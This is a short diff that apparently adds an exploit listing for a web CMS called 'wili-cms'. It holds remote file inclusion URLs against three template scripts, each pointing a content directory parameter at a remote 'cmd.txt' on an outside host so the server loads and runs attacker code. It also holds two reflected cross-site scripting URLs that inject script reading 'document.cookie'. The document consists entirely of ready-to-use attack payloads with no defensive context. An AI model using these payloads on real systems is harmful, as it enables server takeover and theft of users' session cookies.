@@ -1,0 +1,9 @@
+Remote include
+
+example-view/templates/article.php?globals[content_dir]=http://www.example2.com/cmd.txt?
+example-view/templates/root.php?globals[content_dir]=http://www.example2.com/cmd.txt?
+example-view/templates/dates_list.php?globals[content_dir]=http://www.example2.com/cmd.txt?
+
+Xss
+http://www.example.com/vul/wili-cms/relocate.php?&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/vul/wili-cms/example-view/inc/print_button.php?globals[pageid]=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
